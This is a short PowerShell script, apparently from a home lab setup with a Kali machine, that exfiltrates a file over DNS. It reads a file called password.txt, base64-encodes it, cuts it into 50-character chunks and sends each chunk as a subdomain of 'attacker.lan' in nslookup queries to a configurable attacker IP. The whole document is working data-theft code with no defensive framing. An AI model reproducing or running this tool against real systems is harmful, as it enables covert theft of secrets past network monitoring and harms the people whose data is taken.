# CONFIGURE THIS
$KaliIP = "192.168.0.106"  # change to your Kali's IP
$FilePath = "C:\Secret\password.txt.txt"

# Read and encode the file
$Data = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))

# Split into 50-character chunks
$Chunks = ($Data -split "(.{50})" | Where-Object {$_ -ne ""})

# Send each chunk as a DNS query
foreach ($Chunk in $Chunks) {
    $Domain = "$Chunk.attacker.lan"  # fake domain
    try {
        nslookup $Domain $KaliIP
        Start-Sleep -Milliseconds 500
    } catch {
        continue
    }
}
